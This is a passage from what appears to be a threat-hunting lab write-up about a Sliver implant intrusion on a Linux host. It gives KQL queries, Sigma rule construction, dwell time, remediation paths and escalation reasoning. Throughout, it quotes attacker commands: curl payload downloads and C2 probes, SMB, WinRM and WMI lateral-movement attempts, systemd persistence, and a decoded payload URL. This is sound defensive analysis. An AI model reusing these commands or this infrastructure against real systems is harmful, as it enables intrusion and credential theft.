`failed` — every lateral movement attempt failed. `nc -zv 3389`/`5985` confirmed ports open (RC=0) but did not constitute landing; `curl` payload download failed (RC=6); `smbclient put` attempts returned RC=127 (command not found, first attempt) and RC=1 (file delivery failed, subsequent attempts); `pwsh Invoke-Command` (WinRM) returned RC=1; `python3 wmi_exec.py` returned RC=0 locally but with no confirmed execution on the Windows target. `sancadmin` never landed beyond `GF-DEV01`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **User** | `sancadmin` |
| **nc -zv 3389/5985** | `RC=0 — ports open, not landing` |
| **curl -k -o hbsync.exe** | `RC=6 — payload never downloaded` |
| **smbclient put (first)** | `RC=127 — command not found, not yet installed` |
| **smbclient put (subsequent)** | `RC=1 — file delivery failed` |
| **smbclient -L** | `RC=0 — enumeration only, no landing` |
| **pwsh Invoke-Command** | `RC=1 — WinRM execution failed` |
| **python3 wmi_exec.py** | `RC=0 locally — no confirmed remote execution` |

### 💡 Why It Matters
Confirms the operator did not successfully land any tooling on `GF-WS01` via the protocols attempted from `GF-DEV01` — the operator's actual presence on `GF-WS01` (Flag 18/19) was achieved via `t.harris`'s credentials over the SSH tunnel, not via any of these tool deployment attempts. This chronological failure pattern also maps directly to the technique order established in Flag 23.

### 🔗 Attack Chain Position
Closes out the lateral movement investigation thread — confirms the scope of the operator's actual access (account-level via `t.harris`, not tool-level via `sancadmin`'s direct attempts).

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30T23:39:00Z) .. datetime(2026-05-01T04:00:00Z))
| where Computer == "GF-DEV01"
| where ShellUser == "sancadmin"
| project TimeGenerated, Command, ReturnCode
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
Return codes provide a fast way to triage whether an operator's actions actually succeeded — reading them chronologically alongside the commands themselves separates "attempted" from "succeeded" without needing to corroborate against the target host's own telemetry.

**MITRE Reference:** [T1021.002](https://attack.mitre.org/techniques/T1021/002) / [T1021.006](https://attack.mitre.org/techniques/T1021/006) / [T1047](https://attack.mitre.org/techniques/T1047)

</details>

---

<details>
<summary>🚩 <strong>Flag 26: Operator Dwell Time Calculation</strong> — <code>N/A</code> — 🟡 Medium</summary>

### 🎯 Objective
Calculate the dwell time, in whole minutes, from implant detachment (becoming persistent) to the attacker's first SSH login as `sancadmin` from the external IP.

### 📌 Finding
`104` minutes — from implant daemonization at `2026-04-30T21:54:56Z` (Flag 7) to first `sancadmin` SSH success from `194.36.110.139` at `2026-04-30T23:39:13Z` (23:39:13 − 21:54:56 = 1 hour 44 minutes 17 seconds = 104 whole minutes).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Implant Detach Time** | `2026-04-30T21:54:56Z` |
| **First sancadmin SSH Success** | `2026-04-30T23:39:13Z` |
| **Dwell Time** | `104 minutes` |

### 💡 Why It Matters
Quantifies the window during which the implant operated autonomously (harvesting credentials per Flag 10/11) before the operator returned to act on what was harvested — this is the "automated phase" duration of the intrusion.

### 🔗 Attack Chain Position
Bridges the implant daemonization (Flag 7) and the operator's confirmed return (Flag 18 sequence) into a single quantified metric for the executive summary and timeline.

### 🔧 KQL Query Used

```kql
LinuxAuth_CL
| where TimeGenerated between (datetime(2026-04-30T21:54:00Z) .. datetime(2026-05-01T04:00:00Z))
| where SrcIpAddr == "194.36.110.139"
| where EventType == "Logon"
| where EventResult == "Success"
| where TargetUsername == "sancadmin"
| project TimeGenerated, TargetUsername, SrcIpAddr
| order by TimeGenerated asc
| take 1
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
Always calculate dwell time from KQL table timestamps, not the alert UI — the alert UI displays ingestion-delayed times that will not match the underlying event timestamps and can produce an incorrect dwell time calculation.

**MITRE Reference:** N/A — forensic timeline analysis.

</details>

---

<details>
<summary>🚩 <strong>Flag 27: Incident Response Decision Point</strong> — <code>N/A</code> — 🟠 High</summary>

### 🎯 Objective
Given the implant is still active (live threat), determine the correct next escalation path from the available options.

### 📌 Finding
**Incident Response** (containment) — a live, active threat requires containment, not further investigation (T3 SOC — already done), profiling (Threat Intel — comes after containment), or detection tuning (Detection Engineering — comes after containment).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Option A — T3 SOC (more investigation)** | `Rejected — already thoroughly investigated in this hunt` |
| **Option B — Incident Response (containment)** | `Correct — live threat requires immediate containment` |
| **Option C — Threat Intel (profiling)** | `Rejected — comes after containment` |
| **Option D — Detection Engineering (tuning)** | `Rejected — comes after containment` |

### 💡 Why It Matters
This is a pure SOC decision-making/escalation judgment — correctly prioritizing containment of a confirmed-active implant over additional analysis ensures the threat is neutralized before further harm occurs, even though investigation, attribution, and detection engineering all remain valuable follow-on activities.

### 🔗 Attack Chain Position
Represents the decision point that should follow all findings in this report — the implant (`helix-update`) and backdoor (`authorized_keys`) confirmed active at end of investigation (Flag 41) are the direct trigger for this escalation.

### 🔧 KQL Query Used

No querying needed — pure SOC decision-making logic based on the live-threat status established throughout this hunt.

### 🛡️ Detection Recommendation

**Hunting Tip:**
"Live threats need containment, not more investigation. Profiling and detection tuning come after the immediate threat is neutralised." When a hunt confirms an active implant or backdoor, the immediate next step is always escalation to Incident Response for containment — additional analysis can continue in parallel but should not delay containment.

**MITRE Reference:** N/A — SOC escalation decision.

</details>

---

<details>
<summary>🚩 <strong>Flag 28: Cleanup Artifact Identification</strong> — <code>T1543.002, T1098.004, T1105</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the 7 paths on `GF-DEV01` requiring cleanup: binaries in staging, binaries in persistence, scripts, systemd units, and modified credential files.

### 📌 Finding
Seven paths: `/tmp/helix-update`, `/tmp/helix-sync`, `/tmp/hbsync.exe`, `/tmp/wmi_exec.py`, `/usr/local/bin/helix-sync`, `/etc/systemd/system/helix-sync.service`, `/home/a.kumar/.ssh/authorized_keys`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Staging binaries** | `/tmp/helix-update, /tmp/helix-sync, /tmp/hbsync.exe, /tmp/wmi_exec.py` |
| **Persistence binary** | `/usr/local/bin/helix-sync` |
| **Systemd unit** | `/etc/systemd/system/helix-sync.service` |
| **Modified credential file** | `/home/a.kumar/.ssh/authorized_keys` |

### 💡 Why It Matters
This is the complete, actionable cleanup list for `GF-DEV01` — every artifact the operator created or modified that needs to be removed or restored as part of remediation.

### 🔗 Attack Chain Position
Synthesizes file-level artifacts from across the entire investigation (Flags 3, 7, 13, 23/40) into a single remediation checklist input.

### 🔧 KQL Query Used

```kql
LinuxFile_CL
| where TimeGenerated between (datetime(2026-04-30T21:54:00Z) .. datetime(2026-05-01T04:00:00Z))
| where _ResourceId contains "gf-dev01"
| where ActorUsername in ("a.kumar", "sancadmin", "root")
| project TimeGenerated, ActorUsername, TargetFilePath
```

```kql
Syslog
| where TimeGenerated between (datetime(2026-04-30T23:39:00Z) .. datetime(2026-05-01T04:00:00Z))
| where SyslogMessage contains "GF-DEV01"
| where SyslogMessage contains "CommandLine"
| where SyslogMessage contains "helix-sync" or SyslogMessage contains "authorized_keys"
| extend CommandLine = extract("<Data Name=\"CommandLine\">([^<]+)</Data>", 1, SyslogMessage)
| project TimeGenerated, CommandLine
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
Files written via `cp`, `tee`, or `echo >>` don't appear as file-create events in `LinuxFile_CL` — they only show up in process command lines. Always check both `LinuxFile_CL` (for direct file creation events) and `Syslog`/process command lines (for shell-redirection-based writes) when building a complete artifact inventory.

**MITRE Reference:** [T1543.002](https://attack.mitre.org/techniques/T1543/002) / [T1098.004](https://attack.mitre.org/techniques/T1098/004) / [T1105](https://attack.mitre.org/techniques/T1105)

</details>

---

<details>
<summary>🚩 <strong>Flag 29: Cloudflare Network Footprint Confirmation</strong> — <code>T1583.006</code> — 🟠 High</summary>

### 🎯 Objective
Confirm via Sysmon EventID 3 (network) telemetry that the implant's download infrastructure resolves to Cloudflare, and explain why it can't be blocked at the perimeter.

### 📌 Finding
PIDs `34608` and `34612` both connected to `104.21.57.185`, which WHOIS confirms as Cloudflare. Because Cloudflare is a shared CDN hosting millions of legitimate sites, blocking this IP at the perimeter would cause massive collateral damage.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **PID 34608** | `curl, connects to 104.21.57.185` |
| **PID 34612** | `curl, connects to 104.21.57.185` |
| **WHOIS Result** | `Cloudflare (shared CDN)` |
| **Implication** | `Cannot block 104.21.57.185 outright — shared CDN infrastructure` |

### 💡 Why It Matters
Confirms the deliberate use of Cloudflare-fronted infrastructure (also identified in Flag 8) via an independent telemetry source (Sysmon EID 3 in Syslog rather than `LinuxNetwork_CL`), and explains why IP-based perimeter blocking is not a viable mitigation for this specific infrastructure.

### 🔗 Attack Chain Position
Corroborates Flag 8's network footprint finding using a second telemetry source — directly informs the IOC summary's network indicator handling ("MONITOR" rather than "BLOCK" for the Cloudflare ranges).

### 🔧 KQL Query Used

```kql
Syslog
| where TimeGenerated between (datetime(2026-04-30T21:54:00Z) .. datetime(2026-04-30T22:00:00Z))
| where SyslogMessage contains "GF-DEV01"
| where SyslogMessage contains "<EventID>3</EventID>"
| where SyslogMessage contains "curl"
| extend ProcessId = extract("<Data Name=\"ProcessId\">([^<]+)</Data>", 1, SyslogMessage)
| extend DestIp = extract("<Data Name=\"DestinationIp\">([^<]+)</Data>", 1, SyslogMessage)
| extend Initiated = extract("<Data Name=\"Initiated\">([^<]+)</Data>", 1, SyslogMessage)
| project TimeGenerated, ProcessId, DestIp, Initiated
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
When an IP resolves to a major CDN (Cloudflare, Akamai, Fastly, etc.), perimeter IP-blocking is not viable — detection must instead focus on the requesting process/binary (e.g. unsigned binary in `/tmp` making outbound connections), not the destination IP alone.

**MITRE Reference:** [T1583.006](https://attack.mitre.org/techniques/T1583/006)

</details>

---

<details>
<summary>🚩 <strong>Flag 30: Late-Session C2 Listener Probe</strong> — <code>T1071</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify a late-session HEAD-style curl probe from `sancadmin` against an external IP matching TKT-003's IP but a different port.

### 📌 Finding
`194.36.110.139:9080` — `curl -I http://194.36.110.139:9080/`, the same IP as TKT-003 (the original `sancadmin` SSH source) but probing port 9080 instead of SSH port 22.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **User** | `sancadmin` |
| **Command** | `curl -I http://194.36.110.139:9080/` |
| **Target** | `194.36.110.139:9080 (same IP as TKT-003, different port)` |

### 💡 Why It Matters
The operator checking their own infrastructure's responsiveness on a non-SSH port suggests an additional C2 listener (likely HTTP-based) on the same infrastructure — directly ties the operator's session to the C2 IP and surfaces an additional port to monitor/block.

### 🔗 Attack Chain Position
Last operator action observed in this investigation window — directly references the operator's own infrastructure first enriched in Flag 14.

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30T23:39:00Z) .. datetime(2026-05-01T04:00:00Z))
| where ShellUser == "sancadmin"
| where Command contains "curl -I" or Command contains "curl -i"
| project TimeGenerated, Command
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxShellHistory_CL
AND Command contains "curl -I" or Command contains "curl -i"
AND target IP matches a previously-identified operator C2 IP
THEN ALERT — HIGH (Operator Health-Checking Own C2 Infrastructure)
```

**Hunting Tip:**
"HEAD-style" curl probes (`-I`/`-i`) against an IP already identified as operator infrastructure, especially on a port different from the one used for initial access, often indicate an additional C2 listener — block the IP entirely across all ports, not just the originally-observed port.

**MITRE Reference:** [T1071](https://attack.mitre.org/techniques/T1071)

</details>

---

<details>
<summary>🚩 <strong>Flag 31: Sigma Detection Rule — Framework Identification</strong> — <code>T1036, T1543.002</code> — 🟠 High</summary>

### 🎯 Objective
Name a Sigma rule title that would catch the spawn pattern from Flags 10/11, in the format `<framework> implant <action> via <artefact/mechanism>`.

### 📌 Finding
`Sliver implant harvests credentials via process reparenting` — the C2 framework is **Sliver** (not Ligolo, which is only the tunneling component embedded as `helix-sync`), the action is credential harvesting (Flag 10/11), and the mechanism is process reparenting to systemd/PID 1 (Flag 7).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Framework** | `Sliver (open-source Linux C2 framework)` |
| **Action** | `harvests credentials (Flag 10/11: aws_creds, kube_creds, ssh_user_keys, claude_data)` |
| **Mechanism** | `process reparenting (Flag 7: PPID 1 via nohup detachment)` |
| **Rule Title** | `Sliver implant harvests credentials via process reparenting` |

### 💡 Why It Matters
Correctly identifying the C2 framework (Sliver) rather than the tunneling tool (Ligolo, which is what Defender for Cloud's signature in Flag 24 actually detected) is critical for accurate threat intelligence and for writing detection rules that target the actual implant's behavior, not just one of its components.

### 🔗 Attack Chain Position
Synthesizes findings from Flag 7 (process reparenting), Flag 10/11 (credential harvesting), and Flag 24 (Ligolo vs. Sliver distinction) into a formal detection rule title.

### 🔧 KQL Query Used

No KQL query — detection engineering synthesis based on Flags 7, 10, 11, and 24, plus external research into open-source Linux C2 frameworks.

### 🛡️ Detection Recommendation

**Hunting Tip:**
Always verify the C2 framework name against known C2 frameworks rather than assuming from a malware detection name — a single detection signature (e.g. `HackTool:Linux/Ligolo.A!MTB`) may only describe one component of a multi-tool implant package, not the overall framework.

**MITRE Reference:** [T1036](https://attack.mitre.org/techniques/T1036) / [T1543.002](https://attack.mitre.org/techniques/T1543/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 32: Sigma Logsource Identification</strong> — <code>N/A</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the Sigma `logsource` `service` value that the rule from Flag 31 should target, given it fires against syscall-level execve events captured via kernel watch keys.

### 📌 Finding
`auditd` — syscall-level/kernel watch key data corresponds to the auditd logsource, per the official Sigma Taxonomy Appendix (Linux → Service section: `product: linux, service: auditd`, description `auditd.log`).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Data Source** | `LinuxSyscall_CL (established as the auditd table in Flag 10/11)` |
| **Sigma Product** | `linux` |
| **Sigma Service** | `auditd` |
| **Reference** | `https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-taxonomy.md` |

### 💡 Why It Matters
Ensures the Sigma rule from Flag 31 is correctly scoped to the telemetry source that actually contains the detection-relevant data (auditd watch rule events), not a different logsource (e.g. Sysmon) that wouldn't fire on this pattern.

### 🔗 Attack Chain Position
Completes the `logsource` section of the Sigma rule whose `detection` section is built in Flags 33/34.

### 🔧 KQL Query Used

No KQL query — Sigma Taxonomy Appendix reference lookup.

### 🛡️ Detection Recommendation

**Hunting Tip:**
When a detection engineering question asks for a logsource service name, go directly to the official Sigma Taxonomy Appendix — it lists every supported logsource with exact naming, removing any guesswork.

**MITRE Reference:** N/A — detection engineering reference step.

</details>

---

<details>
<summary>🚩 <strong>Flag 33: Sigma Field Identification</strong> — <code>N/A</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the Sigma field name that matches `systemd` (`/sbin/init`) as the parent process, given a partial detection block:
```yaml
Image|endswith: '/helix-update'
???: '/sbin/init'
```

### 📌 Finding
`ParentImage` — per the Sigma Taxonomy Appendix's Process Creation Events fields table, `ParentImage` represents the parent process executable path. Combined with Flag 7's finding (PID 34616, PPID 1 = `/sbin/init`/systemd), the completed detection field is `ParentImage: '/sbin/init'`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Field Name** | `ParentImage` |
| **Field Value** | `/sbin/init (systemd, from Flag 7's PPID 1)` |
| **Reference** | `https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-taxonomy-appendix.md (Fields → Generic → Process Creation Events)` |

### 💡 Why It Matters
Completes the detection logic for the Sigma rule from Flag 31 — the rule now correctly fires when a process whose image ends in `/helix-update` has a parent process image of `/sbin/init`, precisely matching the daemonization behavior confirmed in Flag 7.

### 🔗 Attack Chain Position
Completes the `detection.selection` section of the Sigma rule begun in Flag 31, drawing the field name from the Sigma Taxonomy and the value from Flag 7.

### 🔧 KQL Query Used

No KQL query — Sigma Taxonomy Appendix reference lookup combined with Flag 7's findings.

### 🛡️ Detection Recommendation

**Hunting Tip:**
When a detection engineering question asks for a Sigma field name, go to the Sigma Taxonomy Appendix's Fields section — the Process Creation Events table lists every standard field including all `Parent*` fields. Field names come from the taxonomy; field values come from your own investigation findings — these are two separate lookups.

**MITRE Reference:** N/A — detection engineering reference step.

</details>

---

<details>
<summary>🚩 <strong>Flag 34: Sigma Severity Calibration</strong> — <code>N/A</code> — 🟡 Medium</summary>

### 🎯 Objective
Calibrate the severity level for the Sigma rule completed in Flags 31–33.

### 📌 Finding
`high` — calibrated against confidence (very high — this is a real implant pattern with near-zero false positive rate), impact (high — a Sliver C2 implant spawning credential harvesting tools), and false positive rate (near zero — the specific combination of `ParentImage: /sbin/init` + `Image|endswith: /helix-update` is highly specific).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Confidence** | `Very high` |
| **Impact** | `High (Sliver C2 implant, credential harvesting)` |
| **False Positive Rate** | `Near zero` |
| **Calibrated Severity** | `high` |

### 💡 Why It Matters
Appropriate severity calibration ensures this rule generates an actionable, high-priority alert rather than being buried among lower-severity noise — given the specificity of the detection pattern, a "high" severity is justified without being inflated to "critical."

### 🔗 Attack Chain Position
Finalizes the Sigma rule built across Flags 31–34 — ready for deployment as a detection rule referenced in the Detection Gaps & Recommendations section.

### 🔧 KQL Query Used

No KQL query — severity calibration based on the Sigma severity framework (Low / Medium / High / Critical) applied to the rule's confidence, impact, and false-positive characteristics.

### 🛡️ Detection Recommendation

**Hunting Tip:**
Sigma severity calibration framework: Low = noisy/many false positives/low confidence; Medium = moderate confidence/some false positives; High = high confidence/low false positives/significant impact; Critical = near-certain malicious/immediate response required. High confidence + high impact + near-zero false positive rate = High, not Critical — reserve Critical for patterns that are unambiguous and demand immediate automated response.

**MITRE Reference:** N/A — detection engineering reference step.

</details>

---

<details>
<summary>🚩 <strong>Flag 36: Differentiating Implant Activity from Interactive Sessions</strong> — <code>T1036, T1543.002</code> — 🟠 High</summary>

### 🎯 Objective
Identify the differentiator fields in `LinuxProcess_CL` and `LinuxShellHistory_CL` that prove a parallel, non-interactive ("attacker") stream existed alongside normal session activity during 21:54–23:09 UTC.

### 📌 Finding
`ActorUsername` (in `LinuxProcess_CL`) and `ShellUser` (in `LinuxShellHistory_CL`) — in `LinuxProcess_CL`, several rows show `ActorUsername` blank/missing while `TargetUsername` shows `root`; the corresponding `LinuxShellHistory_CL` rows for the same timeframe show blank/dash values for `ShellUser`/`Tty`. A background C2 implant or detached/reparented process (per Flag 7's `nohup`/systemd reparenting) executes without a traditional interactive session, so the logging mechanism cannot associate a normal "Actor" user — it only records the resulting process running as `root`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **LinuxProcess_CL Differentiator** | `ActorUsername (blank/missing for implant-driven processes, TargetUsername shows root)` |
| **LinuxShellHistory_CL Differentiator** | `ShellUser / Tty (blank or dash for the parallel non-interactive stream)` |
| **Window** | `2026-04-30T21:54:00Z to 2026-04-30T23:09:00Z` |

### 💡 Why It Matters
Provides a reusable, field-level method for distinguishing implant-driven background activity from normal interactive administration across two different telemetry tables — directly explains why the implant's activity (Flags 7, 10, 11) coexisted invisibly alongside `a.kumar`'s normal session without appearing as a standard user-attributed action.

### 🔗 Attack Chain Position
Provides the underlying telemetry-level explanation for why the implant's credential-harvesting activity (Flag 10/11) during the 104-minute dwell window (Flag 26) didn't generate normal user-session telemetry.

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30T21:54:00Z) .. datetime(2026-04-30T23:09:00Z))
| project TimeGenerated, Tty, ShellUser
| order by TimeGenerated asc
```

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30T21:54:00Z) .. datetime(2026-04-30T23:09:00Z))
| project TimeGenerated, ActorUsername, TargetUsername, ActingProcessName
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxProcess_CL
AND isempty(ActorUsername)
AND TargetUsername == "root"
AND ActingProcessName is not a known system daemon
THEN ALERT — HIGH (Process Execution with Missing Actor Context)
```

**Hunting Tip:**
A blank/missing `ActorUsername` with a populated `TargetUsername` (especially `root`) is a signal that a process executed without a standard interactive session — cross-reference the same timeframe in shell history (`ShellUser`/`Tty` blank or dash) to confirm no human session accounts for the activity.

**MITRE Reference:** [T1036](https://attack.mitre.org/techniques/T1036) / [T1543.002](https://attack.mitre.org/techniques/T1543/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 37: Source IP Field Identification for Operator Session</strong> — <code>T1078</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the field in `LinuxAuth_CL` that reveals the source IP of `sancadmin`'s SSH session on `GF-DEV01`.

### 📌 Finding
`SrcIpAddr` — the field in `LinuxAuth_CL` containing the source IP address (`194.36.110.139`) of `sancadmin`'s authentication events on `GF-DEV01`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Table** | `LinuxAuth_CL` |
| **Target Account** | `sancadmin` |
| **Host** | `GF-DEV01` |
| **Field** | `SrcIpAddr` |

### 💡 Why It Matters
Confirms the correct field for source IP attribution within the authentication telemetry table — used throughout this investigation (Flag 18/26) to establish the operator's source infrastructure.

### 🔗 Attack Chain Position
Confirms the field used to establish the timestamp/IP correlation in Flag 26's dwell time calculation.

### 🔧 KQL Query Used

```kql
LinuxAuth_CL
| where TimeGenerated between (datetime(2026-04-30T23:39:00Z) .. datetime(2026-05-01T04:00:00Z))
| where TargetUsername == "sancadmin"
| where DvcHostname == "GF-DEV01"
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
When asked to identify a specific field, run the query without a `project` clause first to see the full schema, then identify which field contains the value of interest (in this case, an external IP address corresponding to `TargetUsername == "sancadmin"`).

**MITRE Reference:** [T1078](https://attack.mitre.org/techniques/T1078)

</details>

---

<details>
<summary>🚩 <strong>Flag 38: Second-Stage File Transfer via SFTP</strong> — <code>T1105</code> — 🟠 High</summary>

### 🎯 Objective
Identify the process that wrote two new binaries (`/tmp/helix-sync` and `/tmp/hbsync.exe`) to `GF-DEV01` after `sancadmin`'s SSH session began, given they don't appear in the implant chain or shell history.

### 📌 Finding
`sftp-server` — both files were transferred via SFTP over `sancadmin`'s SSH session, written to disk by the `sftp-server` process rather than typed as interactive commands.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **User** | `sancadmin` |
| **Files Written** | `/tmp/helix-sync, /tmp/hbsync.exe` |
| **Writing Process** | `sftp-server` |

### 💡 Why It Matters
Explains how the operator's second-stage tooling arrived on disk without generating any shell history entry — a defender relying solely on `LinuxShellHistory_CL` would never see these files appear.

### 🔗 Attack Chain Position
Provides the delivery mechanism for `helix-sync` (later established as persistence in Flag 40) and `hbsync.exe` (referenced as the WinRM payload's intended drop file in Flag 39).

### 🔧 KQL Query Used

```kql
LinuxFile_CL
| where TimeGenerated between (datetime(2026-04-30T23:39:00Z) .. datetime(2026-05-01T04:00:00Z))
| where _ResourceId contains "gf-dev01"
| where ActorUsername == "sancadmin"
| project TimeGenerated, ActorUsername, ActingProcessName, ActingProcessFilePath, TargetFilePath
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxFile_CL
AND ActingProcessName == "sftp-server"
AND TargetFilePath startswith "/tmp/"
AND TargetFilePath endswith (".exe", "") -- executable or no-extension binary
THEN ALERT — HIGH (Binary Dropped to /tmp via SFTP)
```

**Hunting Tip:**
When files appear after an SSH session but aren't in shell history, check `LinuxFile_CL` filtered to that user — the `ActingProcessName` reveals whether files were transferred via SFTP rather than typed commands.

**MITRE Reference:** [T1105](https://attack.mitre.org/techniques/T1105)

</details>

---

<details>
<summary>🚩 <strong>Flag 39: Encoded WinRM Payload Decoding</strong> — <code>T1027, T1059.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Decode the base64-encoded PowerShell payload in `sancadmin`'s WinRM attempt against `10.1.0.133:5985`, to recover a URL and a destination path.

### 📌 Finding
After two layers of decoding (outer UTF-16LE base64, then inner UTF-8 base64), the payload reveals: URL `https://sync.abordsecurity.space/helix-build-agent.exe`, destination path `$env:TEMP\hbsync.exe`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **User** | `sancadmin` |
| **Target** | `10.1.0.133:5985 (WinRM)` |
| **Outer Encoding** | `base64, UTF-16LE` |
| **Inner Encoding** | `base64, UTF-8` |
| **Recovered URL** | `https://sync.abordsecurity.space/helix-build-agent.exe` |
| **Recovered Path** | `$env:TEMP\hbsync.exe` |

### 💡 Why It Matters
Confirms the operator's intended second-stage Windows payload (`helix-build-agent.exe`, to be dropped as `hbsync.exe`) and its source domain (`sync.abordsecurity.space`) — both become permanent IOCs even though delivery ultimately failed (per Flag 25).

### 🔗 Attack Chain Position
Reveals the intended payload behind the failed WinRM attempt in Flag 23's lateral movement sequence — `hbsync.exe` was already on disk via Flag 38's SFTP transfer, suggesting this command was meant to execute it remotely on `GF-WS01`.

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30T23:39:00Z) .. datetime(2026-05-01T04:00:00Z))
| where ShellUser == "sancadmin"
| where Command contains "pwsh" or Command contains "Invoke-Command"
| project TimeGenerated, Command
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxShellHistory_CL or DeviceProcessEvents
AND Command contains "-enc" or Command contains "-EncodedCommand"
AND Command contains "Invoke-Command"
THEN ALERT — CRITICAL (Encoded PowerShell Remote Execution Payload)
```

**Hunting Tip:**
A `-enc` flag in a PowerShell command is always base64 UTF-16LE — decode it first, then look inside the decoded script for any further encoded values. Two distinct decode steps often yield two distinct artifacts (here: a URL and a file path) — don't stop after the first decode.

**MITRE Reference:** [T1027](https://attack.mitre.org/techniques/T1027) / [T1059.001](https://attack.mitre.org/techniques/T1059/001)

</details>

---

<details>
<summary>🚩 <strong>Flag 40: Operator Session Phase Analysis — Primary Objective</strong> — <code>T1543.002</code> — 🟠 High</summary>

### 🎯 Objective
Determine the first of two objectives in `sancadmin`'s session, read chronologically.

### 📌 Finding
**Persistence** — the first command cluster (`chmod +x /usr/local/bin/helix-sync`, `systemctl enable helix-sync`, `systemctl start helix-sync`) establishes `helix-sync` as a persistent systemd service before any lateral movement attempts begin.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **User** | `sancadmin` |
| **Phase 1 (first objective)** | `Persistence — chmod +x, systemctl enable, systemctl start for helix-sync` |
| **Phase 2 (fell back to)** | `Lateral movement — SMB, WinRM, WMI attempts` |

### 💡 Why It Matters
Confirms the operator's priority ordering — ensuring their tunnel/persistence mechanism survives reboots was more important than immediately attempting lateral movement, consistent with the "establish redundant access before further action" pattern typical of mature operators.

### 🔗 Attack Chain Position
Establishes the order of operations within `sancadmin`'s session — persistence (Flag 40, this flag) before lateral movement attempts (Flags 22/23/25).

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30T23:39:00Z) .. datetime(2026-05-01T04:00:00Z))
| where Computer == "GF-DEV01"
| where ShellUser == "sancadmin"
| project TimeGenerated, Command
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
Read shell history chronologically and look for clusters of related commands — the first cluster after a new session begins often reveals the operator's primary objective. `chmod` + `systemctl enable`/`start` is a persistence-setup pattern, not a lateral movement pattern, even though the binary involved (`helix-sync`/Ligolo) is itself a tunneling tool that enables later lateral movement attempts.

**MITRE Reference:** [T1543.002](https://attack.mitre.org/techniques/T1543/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 41: End-of-Shift Artifact Synthesis</strong> — <code>T1543.002, T1098.004</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify three artifacts left behind on `GF-DEV01` at end of shift — one per phase (2, 3, 5), one per telemetry layer (process, file, service state), each in a distinct state (running, persistent, dormant).

### 📌 Finding
`authorized_keys:persistent` (Phase 3, file telemetry), `helix-sync:dormant` (Phase 5, service state), `helix-update:running` (Phase 2, process telemetry).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Phase 2 — helix-update:running** | `PID 34616, PPID 1 (Flag 7) — never killed, still executing as the Sliver C2 implant` |
| **Phase 3 — authorized_keys:persistent** | `/home/a.kumar/.ssh/authorized_keys (Flag 13) — backdoor SSH key, comment octotempest@operator, survives reboots` |
| **Phase 5 — helix-sync:dormant** | `/tmp/helix-sync (Flags 38/40) — original SFTP-dropped copy, never cleaned up; the installed copy at /usr/local/bin/helix-sync is the running service` |

### 💡 Why It Matters
This is the complete end-state summary of the intrusion at the conclusion of the investigation window — three distinct, durable footholds across three different telemetry layers, requiring three different remediation actions (kill process, remove/rotate key, delete dormant file + remove service).

### 🔗 Attack Chain Position
Final synthesis flag — connects findings from Flag 7 (implant runtime state), Flag 13 (backdoor key), and Flags 38/40 (helix-sync delivery and installation) into the end-state that directly drives the Remediation & Containment Checklist and the Incident Response escalation in Flag 27.

### 🔧 KQL Query Used

No new query needed — synthesis of findings from Flags 7, 13, 38, and 40. Note: `claude_data` (Flag 11) and `octotempest@operator` (Flag 13/15) are telemetry fields/comments, not physical artifacts, and are excluded from this answer. Two copies of `helix-sync` existed — the installed/running service (`/usr/local/bin/helix-sync`) and the dormant staged copy (`/tmp/helix-sync`).

### 🛡️ Detection Recommendation

**Hunting Tip:**
Synthesis questions at the end of a hunt often don't require new investigation — they require connecting dots from previous findings. Be careful to distinguish between telemetry fields/comments (which describe artifacts) and the physical artifacts themselves (files, processes, service states) when the question asks specifically for artifacts.

